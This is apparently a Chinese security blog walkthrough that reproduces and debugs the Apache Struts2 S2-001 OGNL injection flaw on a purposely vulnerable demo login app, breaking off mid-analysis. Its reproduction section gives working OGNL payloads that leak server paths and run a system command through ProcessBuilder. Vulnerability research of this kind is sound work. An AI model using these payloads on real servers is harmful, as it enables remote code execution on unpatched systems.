  &lt;meta http-equiv=<span class="hljs-string">"Content-Type"</span> content=<span class="hljs-string">"text/html; charset=UTF-8"</span>&gt;
  &lt;title&gt;S2-<span class="hljs-number">001</span>&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h2&gt;S2-<span class="hljs-number">001</span> Demo&lt;/h2&gt;
&lt;p&gt;link: &lt;a href=<span class="hljs-string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;https:<span class="hljs-comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span>
&lt;s:form action=<span class="hljs-string">"login"</span>&gt;
  &lt;s:textfield name=<span class="hljs-string">"username"</span> label=<span class="hljs-string">"username"</span> /&gt;
  &lt;s:textfield name=<span class="hljs-string">"password"</span> label=<span class="hljs-string">"password"</span> /&gt;
  &lt;s:submit&gt;&lt;/s:submit&gt;
&lt;/s:form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>然后新建welcome.jsp</p>
<pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">"java"</span> contentType=<span class="hljs-string">"text/html; charset=UTF-8"</span>
         pageEncoding=<span class="hljs-string">"UTF-8"</span>%&gt;
&lt;%@ taglib prefix=<span class="hljs-string">"s"</span> uri=<span class="hljs-string">"/struts-tags"</span> %&gt;

&lt;!DOCTYPE html PUBLIC <span class="hljs-string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="hljs-string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;meta http-equiv=<span class="hljs-string">"Content-Type"</span> content=<span class="hljs-string">"text/html; charset=UTF-8"</span>&gt;
  &lt;title&gt;S2-<span class="hljs-number">001</span>&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;p&gt;Hello &lt;s:property value=<span class="hljs-string">"username"</span>&gt;&lt;/s:property&gt;&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>在 src 下新建 org.example package</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;

<span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ActionSupport</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.username;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String username)</span> {
        <span class="hljs-built_in">this</span>.username = username;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> {
        <span class="hljs-built_in">this</span>.password = password;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.username.isEmpty()) || (<span class="hljs-built_in">this</span>.password.isEmpty())) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"error"</span>;
        }

        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.username.equalsIgnoreCase(<span class="hljs-string">"admin"</span>)) &amp;&amp; (<span class="hljs-built_in">this</span>.password.equals(<span class="hljs-string">"admin"</span>))) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"success"</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-string">"error"</span>;
    }
}</code></pre>
<p>修改Struts.xml</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span> ?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">struts</span> <span class="hljs-keyword">PUBLIC</span></span>
<span class="hljs-meta">        <span class="hljs-string">"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span>
<span class="hljs-meta">        <span class="hljs-string">"http://struts.apache.org/dtds/struts-2.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"S2-001"</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">"struts-default"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"login"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.example.LoginAction"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"success"</span>&gt;</span>welcome.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"error"</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span></code></pre>
<p>之后刷新运行，成功的话会出现登录demo</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418105521101.png" alt="image-20240418105521101"></p>
<h2 id="漏洞复现">漏洞复现</h2>
<p>获取Tomcat路径</p>
<pre><code class="hljs scss">%{"tomcatBinDir{"+<span class="hljs-keyword">@java</span>.lang.System<span class="hljs-keyword">@getProperty</span>(<span class="hljs-string">"user.dir"</span>)+<span class="hljs-string">"}"</span>}</code></pre>
<p>这里bp或者查看源码才能看到回显的路径（或者登录框）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418110336591.png" alt="image-20240418110336591"></p>
<p>获取web目录</p>
<pre><code class="hljs scss">%{<span class="hljs-selector-id">#req</span>=<span class="hljs-keyword">@org</span>.apache.struts2.ServletActionContext<span class="hljs-keyword">@getRequest</span>(),#response=#context.get(<span class="hljs-string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>).getWriter(),#response.println(#req.getRealPath(<span class="hljs-string">'/'</span>)),#response.flush(),#response.close()}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418105651749.png" alt="image-20240418105651749"></p>
<p>执行命令</p>
<pre><code class="hljs scss">%{<span class="hljs-selector-id">#a</span>=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"}))<span class="hljs-selector-class">.redirectErrorStream</span>(true)<span class="hljs-selector-class">.start</span>(),<span class="hljs-selector-id">#b</span>=<span class="hljs-selector-id">#a</span><span class="hljs-selector-class">.getInputStream</span>(),<span class="hljs-selector-id">#c</span>=new java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.InputStreamReader</span>(#b),<span class="hljs-selector-id">#d</span>=new java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.BufferedReader</span>(#c),<span class="hljs-selector-id">#e</span>=new char<span class="hljs-selector-attr">[50000]</span>,<span class="hljs-selector-id">#d</span><span class="hljs-selector-class">.read</span>(#e),<span class="hljs-selector-id">#f</span>=<span class="hljs-selector-id">#context</span><span class="hljs-selector-class">.get</span>("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.getWriter</span>()<span class="hljs-selector-class">.println</span>(new java.lang.String(#e)),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.getWriter</span>()<span class="hljs-selector-class">.flush</span>(),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.getWriter</span>()<span class="hljs-selector-class">.close</span>()}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418105851963.png" alt="image-20240418105851963"></p>
<h2 id="漏洞分析">漏洞分析</h2>
<p>上面的漏洞复现有个特性就是，如果我们输入错的内容在输入框，那会保留错误的信息，如下图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418110503466.png" alt="image-20240418110503466"></p>
<p>发现错误的时候，输入的内容没有被清空，接下来输<code>%{1+1}</code>，如下图，发现被解析成2</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418110541828.png" alt="image-20240418110541828"></p>
<p>从而利用这一特性，可以构造一些命令执行语句。</p>
<p>该漏洞是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL 表达式 % {value} 进行解析，然后重新填充到对应的表单数据中。</p>
<p>我们在OGNL表达式原生API getValue 处下断点，该方法用于解析OGNL表达式并返回表达式的值。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418111712186.png" alt="image-20240418111712186"></p>
<p>在输入框中输入payload之后，不断步出知道size=2，此时的调用栈就是漏洞发生的整个过程</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418112111385.png" alt="image-20240418112111385"></p>
<p>下面我们就来逐步分析一下： 首先，判断%{1+1}是在何时被执行的，我们将断点设置在 LoginAction 的 setPassword 和 getPassword 方法上</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418112516200.png" alt="image-20240418112516200"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418112505477.png" alt="image-20240418112505477"></p>
<p>然后，根据最开始的struts工作流程图可以知道在一个http请求进来后，会经过一系列的 拦截器 (Interceptor) ，这些拦截器可以是 Struts2 自带的，也可以是用户自定义的。例如 struts.xml文件中的 package 继承自 struts-default ，而 struts-default 就使用了 Struts2 自带的拦截器。</p>
<p>在 struts2-core-2.0.1.jar/struts-default.xml 中可以找到默认使用的拦截器栈 defaultStack</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418112713851.png" alt="image-20240418112713851"></p>
<p>在拦截器栈defaultStack中， 我们需要关注params这个拦截器。其中， <strong>params拦截器</strong>会将客户端请求数据设置到 <strong>值栈(valueStack)</strong> 中，后续 <strong>JSP</strong> 页面中所有的动态数据都将从值栈中取出。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418112749241.png" alt="image-20240418112749241"></p>
<p>该拦截器对应的权限定类名是 com.opensymphony.xwork2.interceptor.ParametersInterceptor，该拦截器会通过调用对应 Action 的 setter 方法来为其属性进行赋值；最后，对赋值进行判断，如果 password 的值为“%{1+1}”，则证明代码执行的行为发生在执行 Action 之后；如果 password 的值为 2，则证明代码执行的行为发生在 Action 执行之前。通过这种简单的判断就可以减少漏洞点的搜索范围：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418114653551.png" alt="image-20240418114653551"></p>
<p>如上图，当我们发送payload，发现复制完成之后。password值仍然是原型%{1+1}，这意味着，代码执行的行为发生在Action之后。意味着截止到执行完 ParametersInterceptor 拦截器为止，没有代码执行的行为发生。 接下来是执行 Action 的 execute 方法，最终结果是返回“error”字符串</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418114449668.png" alt="image-20240418114449668"></p>
<p>根据Struts2整体执行流程。</p>
<p>Action执行完毕后的步骤是操作对应的模板页面，当LoginAction的execute方法返回“error”字符串时， Struts2要去解析的模板页面是index.jsp。</p>
<p>Struts2 支持多种模板引擎(freemarker、jsp、util、velocity、xslt)，jsp 只是其中一种。所以在真正开始解析之前，Struts2 还需要判断开发人员使用的模板引擎种类，从而调用对应的类和方法。</p>
<p>负责处理 JSP 的类是 org.apache.struts2.views.jsp.ComponentTagSupport。解析会从第一个 Struts2 标签即<code>&lt;s:form action="Login"&gt;</code>开始，当解析到 ComponentTagSupport 类时，首先被调用的方法就是 doStartTag 方法，该方法的代码如下图所示。除 doStartTag 方法外，ComponentTagSupport 中 还有一个 doEndTag 方法，一个是解析标签开始时调用，另一个是解析到标签闭合时调用。</p>
<h3 id="问题一">问题一</h3>
<p>这里看了网上很多文章，可能是我基础不太行，加上众多师傅选择的依赖包版本是struts2-core-2.0.8.jar，而这里我是struts2-core-2.0.1.jar，于是找调试入口点，就找了半天，无从下手。这里也是选择了一种调试的方法（结合多个文章吧）</p>
<p>我们先在自定义的action处下个断点，用来截停分析接受页面传来的数据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418185734859.png" alt="image-20240418185734859"></p>
<p>点击submit就会发现代码断点处接受到了传来的数据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418185854439.png" alt="image-20240418185854439"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418185949219.png" alt="image-20240418185949219"></p>
<p>从这里开始网上的很多文章就直接看调用栈了，说是下图中的DefaultActionInvocation类中反射调用了我们自定义的类 <code>LoginAction</code>。<br>
路径：<code>/xwork-2.0.3.jar!/com/opensymphony/xwork2/DefaultActionInvocation.class</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418190026777.png" alt="image-20240418190026777"></p>
<p>但我直接跟进却看不出个所以然，这里我认为有两种办法，一个就是一个个点击调用栈，寻找谁调用了LoginAction这个类方法，或者就是直接F8跟随看一下各个参数的数据，寻找ActionLogin关键字，如下图，可以看到这里的invokeAction顾名思义或者看代码就能知道通过method.invoke调用了我们的自定义Action类</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418190415404.png" alt="image-20240418190415404"></p>
<p>同时也能看到这里的method值是execute方法，也就是执行Action类下的execute方法。</p>
<p>接下来可能就是马后炮了，网上的文章是根据Struts执行流程来分析整条链子（应该是经验丰富导致的思路），而对我这个小白很茫然，但我们不妨先跟着师傅们分析一下，随后看看有什么课后感想。</p>
<p>根据其框架流程图，我们知道，当接受了一个http请求之后，会先经过一系列拦截器的执行，首先就是参考Struts.xml里面的代码，如下图所示，先是继承了一个struts-default这个Struts2自带的默认拦截器，我们找一下相应的文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418190815693.png" alt="image-20240418190815693"></p>
<p>根据文章以及上面的分析我们也知道，这里要关注的是<code>params</code> 这个拦截器。其中， <code>params</code> 拦截器 会将客户端请求数据设置到 <code>值栈(valueStack)</code> 中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418191406573.png" alt="image-20240418191406573"></p>
<p>后续 <code>JSP</code> 页面中所有的动态数据都将从值栈中取出。那这一点我们如何来验证呢，下个断点即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418191550949.png" alt="image-20240418191550949"></p>
<p>至于为什么是这个方法，我想是因为函数名称来定位的，这里顾名思义就是参数拦截器，而我们恰好是要找拦截器。并且其中的try代码块也涉及到了栈以及我们自定义Action的出现，我们下一个断点先</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418192044643.png" alt="image-20240418192044643"></p>
<p>如上图可以看到，这里的函数参数中存在着password与username，显然这证明了我们客户端存入的数据被存入了ognl的值栈中。接着我们跟进对应的setParameters函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418194545200.png" alt="image-20240418194545200"></p>
<p>while上面的逻辑，先是正常赋个值，ordered值默认就是false，看一下这里的TreeMap，根据GPT回答，这个类就是将传入的Map类对象parameters按照TreeMap对象自身的规则对这些键值对进行排序，然后赋值给params。</p>
<p>接着通过entrySet方法获取params中的全部键值对</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418214737150.png" alt="image-20240418214737150"></p>
<p>这里看一下while的逻辑，通过上面的iterator迭代器调用next获取当前条目，然后强转一下，调用entry的getkey获取当前条目的键，随后通过一条语句给acceptableName赋值，看一下acceptableName逻辑</p>
<pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">acceptableName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-keyword">return</span> name.indexOf(<span class="hljs-number">61</span>) == -<span class="hljs-number">1</span> &amp;&amp; name.indexOf(<span class="hljs-number">44</span>) == -<span class="hljs-number">1</span> &amp;&amp; name.indexOf(<span class="hljs-number">35</span>) == -<span class="hljs-number">1</span> &amp;&amp; name.indexOf(<span class="hljs-number">58</span>) == -<span class="hljs-number">1</span>;
    }</code></pre>
<p>根据GPT，这里就是判断name的值是否含有特殊字符：</p>
<pre><code class="hljs scss">函数内部使用多个indexOf方法检查字符串name是否包含某些特殊字符（ASCII码值），即=（<span class="hljs-number">61</span>）、,（<span class="hljs-number">44</span>）、#（<span class="hljs-number">35</span>）和:（<span class="hljs-number">58</span>）。如果字符串name包含这些特殊字符中的任何一个，则该函数返回false；否则返回true。

具体来说，indexOf方法用于查找指定字符第一次出现在字符串中的位置。如果未找到该字符，则返回-<span class="hljs-number">1</span>。这里，我们检查name中是否包含特定字符，如果没有找到，就返回-<span class="hljs-number">1</span>，表示不包含该字符，继续执行下一个检查。

因此，这段代码实际上是判断字符串name中是否包含特定字符=、,、#和:，如果字符串中包含这些特殊字符，则返回false，否则返回true。</code></pre>
<p>显然这里我们的name是password，这样的话就能跳出while循环，接着通过getValue得到password的值<code>%{1+1}</code>，最后调用stack的setValue将我们输入的数据放入了值栈（这里可以跟进setValue看一下，大体就能知道个逻辑）</p>
<p>现在我们回顾最开始的分析，可以确定这里在最后压入值栈的时候password的值还未被解析，这意味着这段代码的解析肯定是处于这些拦截器之后的，也就是说漏洞点发生在我们自定义Action执行之后，现在我们就理解了为何上述会去先判断漏洞发生点(不然范围太大了)，那接下来就是分析Action之后的代码了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418215606124.png" alt="image-20240418215606124"></p>
<p>回到我们自定义的Action，我们知道根据我们传入的数据，这里最后肯定返回的是error字符串，我们看一下Struts.xml对应的处理办法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418220032925.png" alt="image-20240418220032925"></p>
<p>可以看到转到index.jsp进行处理。我们的<strong>payload</strong>是从<code>index.jsp</code>输入的，这里需要了解的是<strong>jsp</strong>的本质也是一个<strong>Servlet</strong>，在执行jsp的时候<strong>tomcat</strong>会将其转化为java代码，比如这里<code>index.jsp</code>被转化为<code>index_jsp.java</code>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418220510832.png" alt="image-20240418220510832"></p>
<p>负责处理 JSP 的类是 org.apache.struts2.views.jsp.ComponentTagSupport。解析会从第一个 Struts2 标签即<code>&lt;s:form action="Login"&gt;</code>开始，当解析到 ComponentTagSupport 类时，首先被调用的方法 就是 doStartTag 方法，该方法的代码如下图所示。除 doStartTag 方法外，ComponentTagSupport 中 还有一个 doEndTag 方法，一个是解析标签开始时调用，另一个是解析到标签闭合时调用。</p>
<p>路径： <code>/org/apache/struts2/views/jsp/ComponentTagSupport.class</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422200405260.png" alt="image-20240422200405260"></p>
<p>ComponentTagSupport 是一个抽象类。由于首先被解析的是一个 Struts2 Form 标签， org.apache.struts2.views 有一个与 Form标签对应的实体类，类名为 FormTag，是 ComponentTagSupport 的子类。虽然当前断点设置在 ComponentTagSupport 的 doStartTag 方法 上，其实是子类在调用父类方法，因为当前对象是 FormTag 对象：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422201348356.png" alt="image-20240422201348356"></p>
<p>接下来就是重点分析Form标签后面的<code>&lt;s:textfield</code>标签，这两个标签的具体写法如图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422201508921.png" alt="image-20240422201508921"></p>
<p>接下来我们别事后诸葛亮，先从doStartTag开始分析</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422203820265.png" alt="image-20240422203820265"></p>
<p>上述的component调用getBean函数，传入的参数为值栈对象、http请求对象、http相应对象，最后会返回一个TextField对象（这里暂时没看出什么可疑点）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422203306419.png" alt="image-20240422203306419"></p>
<p>下面两幅图片是，getBean中具体的实现代码，也是没有可疑点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422203400327.png" alt="image-20240422203400327"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422203500525.png" alt="image-20240422203500525"></p>
<p><code>this.populateParams();</code>似乎就是单纯的设置属性id</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422204130042.png" alt="image-20240422204130042"></p>
<p>随后调用start函数，不过这里恒为true</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422203644684.png" alt="image-20240422203644684"></p>
<p>接着进入if语句，调用usesBody，依旧恒为false，也就是这个doStartTag始终返回1</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422203659176.png" alt="image-20240422203659176"></p>
<p>接着分析doEndTag，首先跟进函数end，这里继续调用了evaluateParams，继续跟进</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422204503242.png" alt="image-20240422204503242"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422204757333.png" alt="image-20240422204757333"></p>
<p>这个函数前半部分逻辑清晰，就是添加相应的参数（键：键值）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422204814987.png" alt="image-20240422204814987"></p>
<p>接着分析下半部分，这里先展示了两个函数，一个返回恒为true，一个返回恒为String.class的类对象</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422204918103.png" alt="image-20240422204918103"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422205141413.png" alt="image-20240422205141413"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422211852940.png" alt="image-20240422211852940"></p>
<p>根据上面两个函数，这意味着我们一定会进入第二个if语句，由于value的值为null，因此进入else语句，这里的name就是我们的username字符串</p>
